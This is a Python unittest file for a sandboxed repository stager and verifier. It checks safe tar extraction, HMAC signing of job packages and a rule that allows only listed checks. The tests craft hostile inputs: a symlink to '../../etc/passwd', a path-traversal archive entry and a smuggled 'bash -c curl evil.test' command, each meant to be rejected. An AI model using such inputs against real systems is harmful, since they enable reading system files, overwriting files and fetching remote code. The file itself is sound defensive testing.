import hashlib
import hmac
import io
import json
import os
import tarfile
import tempfile
import unittest
from pathlib import Path

import repo_stager
import repo_verifier


def sign(secret, payload):
    body = json.dumps(payload, separators=(",", ":"), sort_keys=True).encode()
    result = dict(payload)
    result["signature"] = hmac.new(secret.encode(), body, hashlib.sha256).hexdigest()
    return result


class RepositorySandboxTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.secret = "repo-verify-test-secret"

        self.old_stage_root = repo_stager.ROOT
        self.old_stage_secret = repo_stager.SECRET
        self.old_verify_root = repo_verifier.ROOT
        self.old_verify_secret = repo_verifier.SECRET

        repo_stager.ROOT = self.root
        repo_stager.SECRET = self.secret
        repo_verifier.ROOT = self.root
        repo_verifier.SECRET = self.secret

    def tearDown(self):
        repo_stager.ROOT = self.old_stage_root
        repo_stager.SECRET = self.old_stage_secret
        repo_verifier.ROOT = self.old_verify_root
        repo_verifier.SECRET = self.old_verify_secret

    def archive(self, files, *, symlink=None, traversal=False):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tf:
            root = "repo-deadbeef"
            for name, data in files.items():
                payload = data.encode()
                info = tarfile.TarInfo(f"{root}/{name}")
                info.size = len(payload)
                info.mode = 0o644
                tf.addfile(info, io.BytesIO(payload))
            if symlink:
                info = tarfile.TarInfo(f"{root}/bad-link")
                info.type = tarfile.SYMTYPE
                info.linkname = symlink
                tf.addfile(info)
            if traversal:
                payload = b"escape"
                info = tarfile.TarInfo(f"{root}/../escape.txt")
                info.size = len(payload)
                tf.addfile(info, io.BytesIO(payload))
        return buf.getvalue()

    def test_safe_extract_builds_hashed_tree(self):
        archive = self.archive({"pkg.py": "VALUE = 42\n", "tests/test_pkg.py": "pass\n"})
        dest = self.root / "staged" / "job"
        tree = repo_stager.safe_extract(archive, dest)
        self.assertEqual(tree["file_count"], 2)
        self.assertEqual((dest / "pkg.py").read_text(), "VALUE = 42\n")
        self.assertTrue(all(len(item["sha256"]) == 64 for item in tree["files"]))

    def test_safe_extract_rejects_symlink_and_traversal(self):
        with self.assertRaisesRegex(ValueError, "special files"):
            repo_stager.safe_extract(
                self.archive({"a.txt": "x"}, symlink="../../etc/passwd"),
                self.root / "staged" / "symlink",
            )
        with self.assertRaisesRegex(ValueError, "path traversal"):
            repo_stager.safe_extract(
                self.archive({"a.txt": "x"}, traversal=True),
                self.root / "staged" / "traversal",
            )

    def test_stage_queues_signed_verifier_package(self):
        archive = self.archive(
            {
                "sample.py": "def add(a,b): return a+b\n",
                "test_sample.py": (
                    "import unittest\n"
                    "from sample import add\n"
                    "class T(unittest.TestCase):\n"
                    "    def test_add(self): self.assertEqual(add(2,3),5)\n"
                ),
            }
        )
        old_fetch = repo_stager.fetch_archive
        repo_stager.fetch_archive = lambda repo_url, sha: (archive, "owner", "repo")
        self.addCleanup(setattr, repo_stager, "fetch_archive", old_fetch)

        package = sign(
            self.secret,
            {
                "version": 1,
                "job_id": "job-1",
                "repo_url": "https://github.com/owner/repo",
                "commit_sha": "a" * 40,
                "checks": ["python_compileall", "python_unittest"],
            },
        )
        result = repo_stager.stage(package)
        self.assertTrue(result["queued_for_verification"])
        verify_package = json.loads((self.root / "inbox" / "job-1.json").read_text())
        supplied = verify_package.pop("signature")
        expected = hmac.new(
            self.secret.encode(),
            json.dumps(verify_package, separators=(",", ":"), sort_keys=True).encode(),
            hashlib.sha256,
        ).hexdigest()
        self.assertEqual(supplied, expected)

    def test_verifier_rejects_tampered_package(self):
        staged = self.root / "staged" / "job-2"
        staged.mkdir(parents=True)
        manifest = b'{"version":1}\n'
        (staged / ".bountyforge-manifest.json").write_bytes(manifest)
        package = sign(
            self.secret,
            {
                "version": 1,
                "job_id": "job-2",
                "staged_path": "job-2",
                "tree_manifest_sha256": hashlib.sha256(manifest).hexdigest(),
                "checks": ["python_compileall"],
            },
        )
        package["checks"] = ["pytest"]
        with self.assertRaisesRegex(ValueError, "signature"):
            repo_verifier.verify_job(package)

    def test_verifier_rejects_free_form_commands(self):
        staged = self.root / "staged" / "job-3"
        staged.mkdir(parents=True)
        manifest = b'{"version":1}\n'
        (staged / ".bountyforge-manifest.json").write_bytes(manifest)
        package = sign(
            self.secret,
            {
                "version": 1,
                "job_id": "job-3",
                "staged_path": "job-3",
                "tree_manifest_sha256": hashlib.sha256(manifest).hexdigest(),
                "checks": ["bash -c curl evil.test"],
            },
        )
        with self.assertRaisesRegex(ValueError, "allowlisted"):
            repo_verifier.verify_job(package)

    def test_offline_verifier_runs_allowlisted_python_tests(self):
        archive = self.archive(
            {
                "calc.py": "def multiply(a,b): return a*b\n",
                "test_calc.py": (
                    "import unittest\n"
                    "from calc import multiply\n"
                    "class CalcTests(unittest.TestCase):\n"
                    "    def test_multiply(self): self.assertEqual(multiply(6,7),42)\n"
                ),
            }
        )
        old_fetch = repo_stager.fetch_archive
        repo_stager.fetch_archive = lambda repo_url, sha: (archive, "owner", "repo")
        self.addCleanup(setattr, repo_stager, "fetch_archive", old_fetch)

        package = sign(
            self.secret,
            {
                "version": 1,
                "job_id": "job-4",
                "repo_url": "https://github.com/owner/repo",
                "commit_sha": "b" * 40,
                "checks": ["python_compileall", "python_unittest"],
            },
        )
        repo_stager.stage(package)
        verify_package = json.loads((self.root / "inbox" / "job-4.json").read_text())
        result = repo_verifier.verify_job(verify_package)
        self.assertTrue(result["passed"])
        self.assertEqual(len(result["checks"]), 2)
        self.assertTrue(all(item["passed"] for item in result["checks"]))


if __name__ == "__main__":
    unittest.main()
